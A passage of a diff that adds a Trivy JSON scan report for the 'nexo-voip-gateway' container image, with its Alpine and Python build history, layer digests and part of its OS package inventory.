@@ -1,0 +1,3444 @@
+{
+  "SchemaVersion": 2,
+  "Trivy": {
+    "Version": "0.76.2"
+  },
+  "ReportID": "01a208b3-6eaf-7f3a-94fc-cb8270cb7b32",
+  "CreatedAt": "2026-11-23T13:58:26.736003242Z",
+  "ArtifactID": "sha256:53050ae82362f5bcee8cc4e920291df72665f3e19d60f791694e5ed066a22aa4",
+  "ArtifactName": "nexo-voip-gateway",
+  "ArtifactType": "container_image",
+  "Metadata": {
+    "Size": 84578304,
+    "OS": {
+      "Family": "alpine",
+      "Name": "3.24.4"
+    },
+    "ImageID": "sha256:fc3c0e347a3aecab0b8fc5498e74a236a0e0adec8e325aee5228ad704923d3cf",
+    "DiffIDs": [
+      "sha256:75f1d9657d880da5f75298e8f40e9928bb6e260c50d26f97af196845307e3064",
+      "sha256:243746bedf72c509c73bf0830b139ea014164f998303776315aff78c64d9db02",
+      "sha256:228d5db3371529ac0f180ac55b7e6d67ca684b63e209bd4efa43915b488bd224",
+      "sha256:3610c924b814aaf0b682c6f647d0f098df0ff1085c6fe392fe3674829d19b546",
+      "sha256:65f6de789749b0331c2d59975480269999ae6684f6784f477a46eebd6154bbbd",
+      "sha256:a81c813197a1e98e8b6ad8e77643c9e2ee52e8747ca0e8d5f504aa5de3913974",
+      "sha256:6da2143d4daa1ec9957b2fea0ee37bec387abdc82ebddb8762da9ac3874b2cea",
+      "sha256:d96cdc96d8658da5acd5d10c93c7b8079ff09010fb77aff2c3ee2b324044f165",
+      "sha256:7efec37c2b0426143e0f93b85761968497e9251116dd1232310f172178cd0907"
+    ],
+    "RepoTags": [
+      "nexo-voip-gateway:latest"
+    ],
+    "RepoDigests": [
+      "nexo-voip-gateway@sha256:fc3c0e347a3aecab0b8fc5498e74a236a0e0adec8e325aee5228ad704923d3cf"
+    ],
+    "Reference": "nexo-voip-gateway:latest",
+    "ImageConfig": {
+      "architecture": "amd64",
+      "created": "2026-11-22T18:08:29.20804127Z",
+      "history": [
+        {
+          "created": "2026-11-05T18:00:28Z",
+          "created_by": "ADD alpine-minirootfs-3.24.4-x86_64.tar.gz / # buildkit",
+          "comment": "buildkit.dockerfile.v0"
+        },
+        {
+          "created": "2026-11-05T18:00:28Z",
+          "created_by": "CMD [\"/bin/sh\"]",
+          "comment": "buildkit.dockerfile.v0",
+          "empty_layer": true
+        },
+        {
+          "created": "2026-11-05T19:25:37Z",
+          "created_by": "ENV PATH=/usr/local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin",
+          "comment": "buildkit.dockerfile.v0",
+          "empty_layer": true
+        },
+        {
+          "created": "2026-11-05T19:25:37Z",
+          "created_by": "ENV LANG=C.UTF-8",
+          "comment": "buildkit.dockerfile.v0",
+          "empty_layer": true
+        },
+        {
+          "created": "2026-11-05T19:25:37Z",
+          "created_by": "RUN /bin/sh -c set -eux; \tapk add --no-cache \t\tca-certificates \t\ttzdata \t; # buildkit",
+          "comment": "buildkit.dockerfile.v0"
+        },
+        {
+          "created": "2026-11-05T19:25:37Z",
+          "created_by": "ENV GPG_KEY=7169605F62C751356D054A26A821E680E5FA6305",
+          "comment": "buildkit.dockerfile.v0",
+          "empty_layer": true
+        },
+        {
+          "created": "2026-11-05T19:25:37Z",
+          "created_by": "ENV PYTHON_VERSION=3.13.18",
+          "comment": "buildkit.dockerfile.v0",
+          "empty_layer": true
+        },
+        {
+          "created": "2026-11-05T19:25:37Z",
+          "created_by": "ENV PYTHON_SHA256=abb0102e6d4ae027509bcb82327d9dd85515b44a3ba8ad538cfc5e9847029f68",
+          "comment": "buildkit.dockerfile.v0",
+          "empty_layer": true
+        },
+        {
+          "created": "2026-11-05T19:30:27Z",
+          "created_by": "RUN /bin/sh -c set -eux; \t\tapk add --no-cache --virtual .build-deps \t\tbluez-dev \t\tbzip2-dev \t\tdpkg-dev dpkg \t\tfindutils \t\tg++ \t\tgcc \t\tgdbm-dev \t\tgnupg \t\tlibc-dev \t\tlibffi-dev \t\tlibnsl-dev \t\tlibtirpc-dev \t\tlinux-headers \t\tmake \t\tncurses-dev \t\topenssl-dev \t\tpax-utils \t\treadline-dev \t\tsqlite-dev \t\ttar \t\ttcl-dev \t\ttk \t\ttk-dev \t\tutil-linux-dev \t\txz \t\txz-dev \t\tzlib-dev \t; \t\twget -O python.tar.xz \"https://www.python.org/ftp/python/${PYTHON_VERSION%%[a-z]*}/Python-$PYTHON_VERSION.tar.xz\"; \techo \"$PYTHON_SHA256 *python.tar.xz\" | sha256sum -c -; \twget -O python.tar.xz.asc \"https://www.python.org/ftp/python/${PYTHON_VERSION%%[a-z]*}/Python-$PYTHON_VERSION.tar.xz.asc\"; \tGNUPGHOME=\"$(mktemp -d)\"; export GNUPGHOME; \tgpg --batch --keyserver hkps://keys.openpgp.org --recv-keys \"$GPG_KEY\"; \tgpg --batch --verify python.tar.xz.asc python.tar.xz; \tgpgconf --kill all; \trm -rf \"$GNUPGHOME\" python.tar.xz.asc; \tmkdir -p /usr/src/python; \ttar --extract --directory /usr/src/python --strip-components=1 --file python.tar.xz; \trm python.tar.xz; \t\tcd /usr/src/python; \tgnuArch=\"$(dpkg-architecture --query DEB_BUILD_GNU_TYPE)\"; \t./configure \t\t--build=\"$gnuArch\" \t\t--enable-loadable-sqlite-extensions \t\t--enable-option-checking=fatal \t\t--enable-shared \t\t$(test \"${gnuArch%%-*}\" != 'riscv64' \u0026\u0026 echo '--with-lto') \t\t--with-ensurepip \t; \tnproc=\"$(nproc)\"; \tEXTRA_CFLAGS=\"-DTHREAD_STACK_SIZE=0x100000\"; \tLDFLAGS=\"${LDFLAGS:-} -Wl,--strip-all\"; \tarch=\"$(apk --print-arch)\"; \tcase \"$arch\" in \t\tx86_64|aarch64) \t\t\tEXTRA_CFLAGS=\"${EXTRA_CFLAGS:-} -fno-omit-frame-pointer -mno-omit-leaf-frame-pointer\"; \t\t\t;; \t\tx86) \t\t\t;; \t\t*) \t\t\tEXTRA_CFLAGS=\"${EXTRA_CFLAGS:-} -fno-omit-frame-pointer\"; \t\t\t;; \tesac; \tmake -j \"$nproc\" \t\t\"EXTRA_CFLAGS=${EXTRA_CFLAGS:-}\" \t\t\"LDFLAGS=${LDFLAGS:-}\" \t; \trm python; \tmake -j \"$nproc\" \t\t\"EXTRA_CFLAGS=${EXTRA_CFLAGS:-}\" \t\t\"LDFLAGS=${LDFLAGS:-} -Wl,-rpath='\\$\\$ORIGIN/../lib'\" \t\tpython \t; \tmake install; \t\tcd /; \trm -rf /usr/src/python; \t\tfind /usr/local -depth \t\t\\( \t\t\t\\( -type d -a \\( -name test -o -name tests -o -name idle_test \\) \\) \t\t\t-o \\( -type f -a \\( -name '*.pyc' -o -name '*.pyo' -o -name 'libpython*.a' \\) \\) \t\t\\) -exec rm -rf '{}' + \t; \t\tfind /usr/local -type f -executable -not \\( -name '*tkinter*' \\) -exec scanelf --needed --nobanner --format '%n#p' '{}' ';' \t\t| tr ',' '\\n' \t\t| sort -u \t\t| awk 'system(\"[ -e /usr/local/lib/\" $1 \" ]\") == 0 { next } { print \"so:\" $1 }' \t\t| xargs -rt apk add --no-network --virtual .python-rundeps \t; \tapk del --no-network .build-deps; \t\texport PYTHONDONTWRITEBYTECODE=1; \tpython3 --version; \tpip3 --version # buildkit",
+          "comment": "buildkit.dockerfile.v0"
+        },
+        {
+          "created": "2026-11-05T19:30:27Z",
+          "created_by": "RUN /bin/sh -c set -eux; \tfor src in idle3 pip3 pydoc3 python3 python3-config; do \t\tdst=\"$(echo \"$src\" | tr -d 3)\"; \t\t[ -s \"/usr/local/bin/$src\" ]; \t\t[ ! -e \"/usr/local/bin/$dst\" ]; \t\tln -svT \"$src\" \"/usr/local/bin/$dst\"; \tdone # buildkit",
+          "comment": "buildkit.dockerfile.v0"
+        },
+        {
+          "created": "2026-11-05T19:30:27Z",
+          "created_by": "CMD [\"python3\"]",
+          "comment": "buildkit.dockerfile.v0",
+          "empty_layer": true
+        },
+        {
+          "created": "2026-11-22T06:31:36Z",
+          "created_by": "/bin/sh -c #(nop) WORKDIR /app"
+        },
+        {
+          "created": "2026-11-22T06:31:47Z",
+          "created_by": "/bin/sh -c #(nop) COPY file:1b0edc3dd770fa9751dd1d19dd4e6ff43084a60ed73217c7620e103d2945e1d7 in . "
+        },
+        {
+          "created": "2026-11-22T06:33:42Z",
+          "created_by": "/bin/sh -c pip install --no-cache-dir -r requirements.txt"
+        },
+        {
+          "created": "2026-11-22T18:08:02Z",
+          "created_by": "/bin/sh -c #(nop) COPY file:f4d4b449b3c4c0b7a4774834e490d94f2017b8231ea25550945059a3b0d684bc in . "
+        },
+        {
+          "created": "2026-11-22T18:08:09Z",
+          "created_by": "/bin/sh -c adduser -D -H -u 10001 nexo \u0026\u0026 mkdir -p /data \u0026\u0026 chown nexo:nexo /data"
+        },
+        {
+          "created": "2026-11-22T18:08:16Z",
+          "created_by": "/bin/sh -c #(nop)  USER 10001",
+          "empty_layer": true
+        },
+        {
+          "created": "2026-11-22T18:08:21Z",
+          "created_by": "/bin/sh -c #(nop)  EXPOSE 5000",
+          "empty_layer": true
+        },
+        {
+          "created": "2026-11-22T18:08:25Z",
+          "created_by": "/bin/sh -c #(nop)  CMD [\"gunicorn\" \"--workers\" \"1\" \"--threads\" \"8\" \"--bind\" \"0.0.0.0:5000\" \"app:app\"]",
+          "empty_layer": true
+        },
+        {
+          "created": "2026-11-22T18:08:29Z",
+          "created_by": "/bin/sh -c #(nop)  LABEL com.docker.compose.image.builder=classic",
+          "empty_layer": true
+        }
+      ],
+      "os": "linux",
+      "rootfs": {
+        "type": "layers",
+        "diff_ids": [
+          "sha256:75f1d9657d880da5f75298e8f40e9928bb6e260c50d26f97af196845307e3064",
+          "sha256:243746bedf72c509c73bf0830b139ea014164f998303776315aff78c64d9db02",
+          "sha256:228d5db3371529ac0f180ac55b7e6d67ca684b63e209bd4efa43915b488bd224",
+          "sha256:3610c924b814aaf0b682c6f647d0f098df0ff1085c6fe392fe3674829d19b546",
+          "sha256:65f6de789749b0331c2d59975480269999ae6684f6784f477a46eebd6154bbbd",
+          "sha256:a81c813197a1e98e8b6ad8e77643c9e2ee52e8747ca0e8d5f504aa5de3913974",
+          "sha256:6da2143d4daa1ec9957b2fea0ee37bec387abdc82ebddb8762da9ac3874b2cea",
+          "sha256:d96cdc96d8658da5acd5d10c93c7b8079ff09010fb77aff2c3ee2b324044f165",
+          "sha256:7efec37c2b0426143e0f93b85761968497e9251116dd1232310f172178cd0907"
+        ]
+      },
+      "config": {
+        "Cmd": [
+          "gunicorn",
+          "--workers",
+          "1",
+          "--threads",
+          "8",
+          "--bind",
+          "0.0.0.0:5000",
+          "app:app"
+        ],
+        "Env": [
+          "PATH=/usr/local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin",
+          "LANG=C.UTF-8",
+          "GPG_KEY=7169605F62C751356D054A26A821E680E5FA6305",
+          "PYTHON_VERSION=3.13.18",
+          "PYTHON_SHA256=abb0102e6d4ae027509bcb82327d9dd85515b44a3ba8ad538cfc5e9847029f68"
+        ],
+        "Labels": {
+          "com.docker.compose.image.builder": "classic"
+        },
+        "User": "10001",
+        "WorkingDir": "/app",
+        "ExposedPorts": {
+          "5000/tcp": {}
+        }
+      }
+    },
+    "Layers": [
+      {
+        "Size": 8713728,
+        "Digest": "sha256:881fc932939efef04ca120ad44bbd2c0917851eb247aa4995428afb1e80ede17",
+        "DiffID": "sha256:75f1d9657d880da5f75298e8f40e9928bb6e260c50d26f97af196845307e3064"
+      },
+      {
+        "Size": 1544192,
+        "Digest": "sha256:ce6949f6b5329553c2f3fc626421da4f70d633cfddb6ad2227f3ac0b7205bd8f",
+        "DiffID": "sha256:243746bedf72c509c73bf0830b139ea014164f998303776315aff78c64d9db02"
+      },
+      {
+        "Size": 37697024,
+        "Digest": "sha256:f9abc654947e09e316e7703544bd7e68123d383aeb70c5a9cf15be03e71721ce",
+        "DiffID": "sha256:228d5db3371529ac0f180ac55b7e6d67ca684b63e209bd4efa43915b488bd224"
+      },
+      {
+        "Size": 5120,
+        "Digest": "sha256:17af2db0edc9c7ff966b9f7e8424caed1203bc5cec5e3c061f3516ef5b8d9ece",
+        "DiffID": "sha256:3610c924b814aaf0b682c6f647d0f098df0ff1085c6fe392fe3674829d19b546"
+      },
+      {
+        "Size": 1536,
+        "Digest": "sha256:f83dfa26f73c569afff655ef16d431725fe85d93bf9d6833200364dac1825063",
+        "DiffID": "sha256:65f6de789749b0331c2d59975480269999ae6684f6784f477a46eebd6154bbbd"
+      },
+      {
+        "Size": 2560,
+        "Digest": "sha256:253bf9ba1cada1e17863e6a5b3683c8d5743822f5cf14a8ef891e5771cfc2c97",
+        "DiffID": "sha256:a81c813197a1e98e8b6ad8e77643c9e2ee52e8747ca0e8d5f504aa5de3913974"
+      },
+      {
+        "Size": 36588544,
+        "Digest": "sha256:fedec2ec703659d97a141f740c40415a1202ef024ee6606aff9120d74a5503f8",
+        "DiffID": "sha256:6da2143d4daa1ec9957b2fea0ee37bec387abdc82ebddb8762da9ac3874b2cea"
+      },
+      {
+        "Size": 15872,
+        "Digest": "sha256:19b19dd8e4d4f045b7589386d8fb41574313da26a271ea78837bd82d1ae01aac",
+        "DiffID": "sha256:d96cdc96d8658da5acd5d10c93c7b8079ff09010fb77aff2c3ee2b324044f165"
+      },
+      {
+        "Size": 9728,
+        "Digest": "sha256:9a6a261b4520dc460a72049d916784e6131f4e1c1f8de2ef618b8c3f2a4d91ac",
+        "DiffID": "sha256:7efec37c2b0426143e0f93b85761968497e9251116dd1232310f172178cd0907"
+      }
+    ]
+  },
+  "Results": [
+    {
+      "Target": "nexo-voip-gateway (alpine 3.24.4)",
+      "Class": "os-pkgs",
+      "Type": "alpine",
+      "Packages": [
+        {
+          "ID": ".python-rundeps@20261105.193026",
+          "Name": ".python-rundeps",
+          "Identifier": {
+            "PURL": "pkg:apk/alpine/.python-rundeps@20261105.193026?arch=noarch\u0026distro=3.24.4",
+            "UID": "5438be5a8df96429"
+          },
+          "Version": "20261105.193026",
+          "Arch": "noarch",
+          "DependsOn": [
+            "gdbm@1.26-r0",
+            "libbz2@1.0.8-r6",
+            "libcrypto3@3.5.9-r0",
+            "libffi@3.5.2-r1",
+            "libncursesw@6.6_p20260516-r0",
+            "libpanelw@6.6_p20260516-r0",
+            "libssl3@3.5.9-r0",
+            "libuuid@2.42.3-r1",
+            "musl@1.2.6-r3",
+            "readline@8.3.3-r1",
+            "sqlite-libs@3.53.4-r0",
+            "xz-libs@5.8.4-r0",
+            "zlib@1.3.2-r1"
+          ],
+          "Layer": {
+            "Digest": "sha256:f9abc654947e09e316e7703544bd7e68123d383aeb70c5a9cf15be03e71721ce",
+            "DiffID": "sha256:228d5db3371529ac0f180ac55b7e6d67ca684b63e209bd4efa43915b488bd224"
+          },
+          "Digest": "sha1:5512b1baea9385e66561167d97574c75a56e167f",
+          "AnalyzedBy": "apk"
+        },
+        {
+          "ID": "alpine-baselayout@3.7.2-r1",
+          "Name": "alpine-baselayout",
+          "Identifier": {
+            "PURL": "pkg:apk/alpine/alpine-baselayout@3.7.2-r1?arch=x86_64\u0026distro=3.24.4",
+            "UID": "1b9c543300f8073e"
+          },
+          "Version": "3.7.2-r1",
+          "Arch": "x86_64",
+          "SrcName": "alpine-baselayout",
+          "SrcVersion": "3.7.2-r1",
+          "Licenses": [
+            "GPL-2.0-only"
+          ],
+          "Maintainer": "Natanael Copa \u003cncopa@alpinelinux.org\u003e",
+          "DependsOn": [
+            "alpine-baselayout-data@3.7.2-r1",
+            "busybox-binsh@1.37.0-r31"
+          ],
+          "Layer": {
+            "Digest": "sha256:881fc932939efef04ca120ad44bbd2c0917851eb247aa4995428afb1e80ede17",
+            "DiffID": "sha256:75f1d9657d880da5f75298e8f40e9928bb6e260c50d26f97af196845307e3064"
+          },
+          "Digest": "sha1:f0fcfdc2f4da058af6473bc45c4eab62916225b2",
+          "InstalledFiles": [
+            "etc/motd",
+            "etc/crontabs/root",
+            "etc/modprobe.d/aliases.conf",
+            "etc/modprobe.d/blacklist.conf",
+            "etc/modprobe.d/i386.conf",
+            "etc/profile.d/20locale.sh",
+            "etc/profile.d/README",
+            "etc/profile.d/color_prompt.sh.disabled",
+            "usr/lib/sysctl.d/00-alpine.conf",
+            "var/lock",
+            "var/run",
+            "var/spool/mail",
+            "var/spool/cron/crontabs"
+          ],
+          "AnalyzedBy": "apk"
+        },
+        {
+          "ID": "alpine-baselayout-data@3.7.2-r1",
+          "Name": "alpine-baselayout-data",
+          "Identifier": {
+            "PURL": "pkg:apk/alpine/alpine-baselayout-data@3.7.2-r1?arch=x86_64\u0026distro=3.24.4",
+            "UID": "fcc3cd90122d8aa7"
+          },
+          "Version": "3.7.2-r1",
+          "Arch": "x86_64",
+          "SrcName": "alpine-baselayout",
+          "SrcVersion": "3.7.2-r1",
+          "Licenses": [
+            "GPL-2.0-only"
+          ],
+          "Maintainer": "Natanael Copa \u003cncopa@alpinelinux.org\u003e",
+          "Layer": {
+            "Digest": "sha256:881fc932939efef04ca120ad44bbd2c0917851eb247aa4995428afb1e80ede17",
+            "DiffID": "sha256:75f1d9657d880da5f75298e8f40e9928bb6e260c50d26f97af196845307e3064"
+          },
+          "Digest": "sha1:c6f9bded17d844b6f1b0bb5766d2c35c0d5c8508",
+          "InstalledFiles": [
+            "etc/fstab",
+            "etc/group",
+            "etc/hostname",
+            "etc/hosts",
+            "etc/inittab",
+            "etc/modules",
+            "etc/mtab",
+            "etc/nsswitch.conf",
+            "etc/passwd",
+            "etc/profile",
+            "etc/protocols",
+            "etc/services",
+            "etc/shadow",
+            "etc/shells",
+            "etc/sysctl.conf"
+          ],
+          "AnalyzedBy": "apk"
+        },
+        {
+          "ID": "alpine-keys@2.6-r0",
+          "Name": "alpine-keys",
+          "Identifier": {
+            "PURL": "pkg:apk/alpine/alpine-keys@2.6-r0?arch=x86_64\u0026distro=3.24.4",
+            "UID": "cb1f6c8fa74713e0"
+          },
+          "Version": "2.6-r0",
+          "Arch": "x86_64",
+          "SrcName": "alpine-keys",
+          "SrcVersion": "2.6-r0",
+          "Licenses": [
+            "MIT"
+          ],
+          "Maintainer": "Natanael Copa \u003cncopa@alpinelinux.org\u003e",
+          "Layer": {
+            "Digest": "sha256:881fc932939efef04ca120ad44bbd2c0917851eb247aa4995428afb1e80ede17",
+            "DiffID": "sha256:75f1d9657d880da5f75298e8f40e9928bb6e260c50d26f97af196845307e3064"
+          },
+          "Digest": "sha1:d8d6b80e53c059a77e4915da78ba964f3ffea240",
+          "InstalledFiles": [
+            "etc/apk/keys/alpine-devel@lists.alpinelinux.org-4a6a0840.rsa.pub",
+            "etc/apk/keys/alpine-devel@lists.alpinelinux.org-5261cecb.rsa.pub",
+            "etc/apk/keys/alpine-devel@lists.alpinelinux.org-6165ee59.rsa.pub",
+            "usr/share/apk/keys/alpine-devel@lists.alpinelinux.org-4a6a0840.rsa.pub",
+            "usr/share/apk/keys/alpine-devel@lists.alpinelinux.org-5243ef4b.rsa.pub",
+            "usr/share/apk/keys/alpine-devel@lists.alpinelinux.org-524d27bb.rsa.pub",
+            "usr/share/apk/keys/alpine-devel@lists.alpinelinux.org-5261cecb.rsa.pub",
+            "usr/share/apk/keys/alpine-devel@lists.alpinelinux.org-58199dcc.rsa.pub",
+            "usr/share/apk/keys/alpine-devel@lists.alpinelinux.org-58cbb476.rsa.pub",
+            "usr/share/apk/keys/alpine-devel@lists.alpinelinux.org-58e4f17d.rsa.pub",
+            "usr/share/apk/keys/alpine-devel@lists.alpinelinux.org-5e69ca50.rsa.pub",
+            "usr/share/apk/keys/alpine-devel@lists.alpinelinux.org-60ac2099.rsa.pub",
+            "usr/share/apk/keys/alpine-devel@lists.alpinelinux.org-6165ee59.rsa.pub",
+            "usr/share/apk/keys/alpine-devel@lists.alpinelinux.org-61666e3f.rsa.pub",
+            "usr/share/apk/keys/alpine-devel@lists.alpinelinux.org-616a9724.rsa.pub",
+            "usr/share/apk/keys/alpine-devel@lists.alpinelinux.org-616abc23.rsa.pub",
+            "usr/share/apk/keys/alpine-devel@lists.alpinelinux.org-616ac3bc.rsa.pub",
+            "usr/share/apk/keys/alpine-devel@lists.alpinelinux.org-616adfeb.rsa.pub",
+            "usr/share/apk/keys/alpine-devel@lists.alpinelinux.org-616ae350.rsa.pub",
+            "usr/share/apk/keys/alpine-devel@lists.alpinelinux.org-616db30d.rsa.pub",
+            "usr/share/apk/keys/alpine-devel@lists.alpinelinux.org-66ba20fe.rsa.pub",
+            "usr/share/apk/keys/aarch64/alpine-devel@lists.alpinelinux.org-58199dcc.rsa.pub",
+            "usr/share/apk/keys/aarch64/alpine-devel@lists.alpinelinux.org-616ae350.rsa.pub",
+            "usr/share/apk/keys/armhf/alpine-devel@lists.alpinelinux.org-524d27bb.rsa.pub",
+            "usr/share/apk/keys/armhf/alpine-devel@lists.alpinelinux.org-616a9724.rsa.pub",
+            "usr/share/apk/keys/armv7/alpine-devel@lists.alpinelinux.org-524d27bb.rsa.pub",
+            "usr/share/apk/keys/armv7/alpine-devel@lists.alpinelinux.org-616adfeb.rsa.pub",
+            "usr/share/apk/keys/loongarch64/alpine-devel@lists.alpinelinux.org-66ba20fe.rsa.pub",
+            "usr/share/apk/keys/mips64/alpine-devel@lists.alpinelinux.org-5e69ca50.rsa.pub",
+            "usr/share/apk/keys/ppc64le/alpine-devel@lists.alpinelinux.org-58cbb476.rsa.pub",
+            "usr/share/apk/keys/ppc64le/alpine-devel@lists.alpinelinux.org-616abc23.rsa.pub",
+            "usr/share/apk/keys/riscv64/alpine-devel@lists.alpinelinux.org-60ac2099.rsa.pub",
+            "usr/share/apk/keys/riscv64/alpine-devel@lists.alpinelinux.org-616db30d.rsa.pub",
+            "usr/share/apk/keys/s390x/alpine-devel@lists.alpinelinux.org-58e4f17d.rsa.pub",
+            "usr/share/apk/keys/s390x/alpine-devel@lists.alpinelinux.org-616ac3bc.rsa.pub",
+            "usr/share/apk/keys/x86/alpine-devel@lists.alpinelinux.org-4a6a0840.rsa.pub",
+            "usr/share/apk/keys/x86/alpine-devel@lists.alpinelinux.org-5243ef4b.rsa.pub",
+            "usr/share/apk/keys/x86/alpine-devel@lists.alpinelinux.org-61666e3f.rsa.pub",
+            "usr/share/apk/keys/x86_64/alpine-devel@lists.alpinelinux.org-4a6a0840.rsa.pub",
+            "usr/share/apk/keys/x86_64/alpine-devel@lists.alpinelinux.org-5261cecb.rsa.pub",
+            "usr/share/apk/keys/x86_64/alpine-devel@lists.alpinelinux.org-6165ee59.rsa.pub"
+          ],
+          "AnalyzedBy": "apk"
+        },
+        {
+          "ID": "alpine-release@3.24.4-r0",
+          "Name": "alpine-release",
+          "Identifier": {
+            "PURL": "pkg:apk/alpine/alpine-release@3.24.4-r0?arch=x86_64\u0026distro=3.24.4",
+            "UID": "15b8e9817f0698d8"
+          },
+          "Version": "3.24.4-r0",
+          "Arch": "x86_64",
+          "SrcName": "alpine-base",
+          "SrcVersion": "3.24.4-r0",
+          "Licenses": [
+            "MIT"
+          ],
+          "Maintainer": "Natanael Copa \u003cncopa@alpinelinux.org\u003e",
+          "DependsOn": [
+            "alpine-keys@2.6-r0"
+          ],
+          "Layer": {
+            "Digest": "sha256:881fc932939efef04ca120ad44bbd2c0917851eb247aa4995428afb1e80ede17",
+            "DiffID": "sha256:75f1d9657d880da5f75298e8f40e9928bb6e260c50d26f97af196845307e3064"
+          },
+          "Digest": "sha1:87bf87b1072870b784437d26bbbb7ab4df851590",
+          "InstalledFiles": [
+            "etc/alpine-release",
+            "etc/issue",
+            "etc/os-release",
+            "etc/secfixes.d/alpine",
+            "usr/lib/os-release"
+          ],
+          "AnalyzedBy": "apk"
+        },
+        {
+          "ID": "apk-tools@3.0.9-r0",
+          "Name": "apk-tools",
+          "Identifier": {
+            "PURL": "pkg:apk/alpine/apk-tools@3.0.9-r0?arch=x86_64\u0026distro=3.24.4",
+            "UID": "cee1f7d4978ea6b0"
+          },
+          "Version": "3.0.9-r0",
+          "Arch": "x86_64",
+          "SrcName": "apk-tools",
+          "SrcVersion": "3.0.9-r0",
+          "Licenses": [
+            "GPL-2.0-only"
+          ],
+          "Maintainer": "Natanael Copa \u003cncopa@alpinelinux.org\u003e",
+          "DependsOn": [
+            "ca-certificates-bundle@20261020-r0",
+            "libapk@3.0.9-r0",
+            "libcrypto3@3.5.9-r0",
+            "musl@1.2.6-r3",
+            "zlib@1.3.2-r1"
+          ],
+          "Layer": {
+            "Digest": "sha256:881fc932939efef04ca120ad44bbd2c0917851eb247aa4995428afb1e80ede17",
+            "DiffID": "sha256:75f1d9657d880da5f75298e8f40e9928bb6e260c50d26f97af196845307e3064"
+          },
+          "Digest": "sha1:27bc7866754fcf6b1eb12774b5c8e6c0842390d6",
+          "InstalledFiles": [
+            "sbin/apk"
+          ],
+          "AnalyzedBy": "apk"
+        },
+        {
+          "ID": "busybox@1.37.0-r31",
+          "Name": "busybox",
+          "Identifier": {
+            "PURL": "pkg:apk/alpine/busybox@1.37.0-r31?arch=x86_64\u0026distro=3.24.4",
+            "UID": "fc424f8052296b79"
+          },
+          "Version": "1.37.0-r31",
+          "Arch": "x86_64",
+          "SrcName": "busybox",
+          "SrcVersion": "1.37.0-r31",
+          "Licenses": [
+            "GPL-2.0-only"
+          ],
+          "Maintainer": "Sören Tempel \u003csoeren+alpine@soeren-tempel.net\u003e",
+          "DependsOn": [
+            "musl@1.2.6-r3"
+          ],
+          "Layer": {
+            "Digest": "sha256:881fc932939efef04ca120ad44bbd2c0917851eb247aa4995428afb1e80ede17",
+            "DiffID": "sha256:75f1d9657d880da5f75298e8f40e9928bb6e260c50d26f97af196845307e3064"
+          },
+          "Digest": "sha1:b5405ebc02f7dd8be95b6265c54b243d5456ab8f",
+          "InstalledFiles": [
+            "bin/busybox",
+            "etc/securetty",
+            "etc/busybox-paths.d/busybox",
+            "etc/logrotate.d/acpid",
+            "etc/network/if-up.d/dad",
+            "etc/udhcpc/udhcpc.conf",
+            "usr/share/udhcpc/default.script"
+          ],
+          "AnalyzedBy": "apk"
+        },
+        {
+          "ID": "busybox-binsh@1.37.0-r31",
+          "Name": "busybox-binsh",
+          "Identifier": {
+            "PURL": "pkg:apk/alpine/busybox-binsh@1.37.0-r31?arch=x86_64\u0026distro=3.24.4",
+            "UID": "1ec8a3d5d2b63297"
+          },
+          "Version": "1.37.0-r31",
+          "Arch": "x86_64",
+          "SrcName": "busybox",
+          "SrcVersion": "1.37.0-r31",
+          "Licenses": [
+            "GPL-2.0-only"
+          ],
+          "Maintainer": "Sören Tempel \u003csoeren+alpine@soeren-tempel.net\u003e",
+          "DependsOn": [
+            "busybox@1.37.0-r31"
+          ],
+          "Layer": {
+            "Digest": "sha256:881fc932939efef04ca120ad44bbd2c0917851eb247aa4995428afb1e80ede17",
+            "DiffID": "sha256:75f1d9657d880da5f75298e8f40e9928bb6e260c50d26f97af196845307e3064"
+          },
+          "Digest": "sha1:5cbd14acc6f1804c5bac6c77dc2c492f010b0fc7",
+          "InstalledFiles": [
+            "bin/sh"
+          ],
+          "AnalyzedBy": "apk"
+        },
+        {
+          "ID": "ca-certificates@20261020-r0",
+          "Name": "ca-certificates",
+          "Identifier": {
+            "PURL": "pkg:apk/alpine/ca-certificates@20261020-r0?arch=x86_64\u0026distro=3.24.4",
+            "UID": "6e5aa65436c21892"
+          },
+          "Version": "20261020-r0",
+          "Arch": "x86_64",
+          "SrcName": "ca-certificates",
+          "SrcVersion": "20261020-r0",
+          "Licenses": [
+            "MPL-2.0",
+            "MIT"
+          ],
+          "Maintainer": "Natanael Copa \u003cncopa@alpinelinux.org\u003e",
+          "DependsOn": [
+            "busybox-binsh@1.37.0-r31",
+            "libcrypto3@3.5.9-r0",
+            "musl@1.2.6-r3"
+          ],
+          "Layer": {
+            "Digest": "sha256:ce6949f6b5329553c2f3fc626421da4f70d633cfddb6ad2227f3ac0b7205bd8f",
+            "DiffID": "sha256:243746bedf72c509c73bf0830b139ea014164f998303776315aff78c64d9db02"
+          },
+          "Digest": "sha1:bb910099b0e7b8aaf6c91497986fdca3abb13d35",
+          "InstalledFiles": [
+            "etc/ca-certificates.conf",
+            "etc/apk/protected_paths.d/ca-certificates.list",
+            "etc/ca-certificates/update.d/certhash",
+            "usr/bin/c_rehash",
+            "usr/sbin/update-ca-certificates",
+            "usr/share/ca-certificates/mozilla/ACCVRAIZ1.crt",
+            "usr/share/ca-certificates/mozilla/AC_RAIZ_FNMT-RCM.crt",
+            "usr/share/ca-certificates/mozilla/AC_RAIZ_FNMT-RCM_SERVIDORES_SEGUROS.crt",
+            "usr/share/ca-certificates/mozilla/ANF_Secure_Server_Root_CA.crt",
+            "usr/share/ca-certificates/mozilla/Actalis_Authentication_Root_CA.crt",
+            "usr/share/ca-certificates/mozilla/Amazon_Root_CA_1.crt",
+            "usr/share/ca-certificates/mozilla/Amazon_Root_CA_2.crt",
+            "usr/share/ca-certificates/mozilla/Amazon_Root_CA_3.crt",
+            "usr/share/ca-certificates/mozilla/Amazon_Root_CA_4.crt",
+            "usr/share/ca-certificates/mozilla/Atos_TrustedRoot_Root_CA_ECC_TLS_2021.crt",
+            "usr/share/ca-certificates/mozilla/Atos_TrustedRoot_Root_CA_RSA_TLS_2021.crt",
+            "usr/share/ca-certificates/mozilla/Autoridad_de_Certificacion_Firmaprofesional_CIF_A62634068.crt",
+            "usr/share/ca-certificates/mozilla/BJCA_Global_Root_CA1.crt",
+            "usr/share/ca-certificates/mozilla/BJCA_Global_Root_CA2.crt",
+            "usr/share/ca-certificates/mozilla/Buypass_Class_2_Root_CA.crt",
